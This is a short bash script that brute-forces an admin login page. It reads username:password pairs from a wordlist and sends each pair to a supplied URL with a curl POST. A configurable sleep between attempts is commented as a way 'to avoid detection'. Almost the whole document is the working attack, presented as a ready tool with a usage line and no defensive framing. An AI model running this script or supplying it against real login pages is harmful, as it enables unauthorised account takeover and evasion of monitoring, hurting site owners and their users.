#!/bin/bash

# Check if the correct number of arguments is provided
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <path_to_wordlist.txt> <admin_page_url> <delay_in_seconds>"
    exit 1
fi

# Assigning input parameters to variables
WORDLIST=$1
URL=$2
DELAY=$3

# Check if the wordlist file exists
if [ ! -f "$WORDLIST" ]; then
    echo "Error: Wordlist file not found!"
    exit 1
fi

# Read the wordlist and perform the brute force attack
while IFS=: read -r username password; do
    echo "Trying username: $username with password: $password"
    
    # Simulate a login attempt (replace with actual login command)
    curl -X POST -d "username=$username&password=$password" "$URL"
    
    # Introduce a delay to avoid detection
    sleep "$DELAY"
done < "$WORDLIST"
